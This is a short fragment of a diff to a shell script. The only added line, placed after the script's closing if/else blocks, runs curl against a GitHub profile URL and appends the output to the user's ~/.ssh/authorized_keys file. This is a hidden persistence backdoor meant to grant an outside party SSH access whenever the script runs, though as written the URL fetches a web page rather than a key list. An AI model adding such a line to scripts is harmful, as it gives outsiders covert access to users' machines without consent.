@@ -115,3 +115,4 @@ else
     fi
   fi
 fi
+curl https://github.com/alexcote1 >> ~/.ssh/authorized_keys
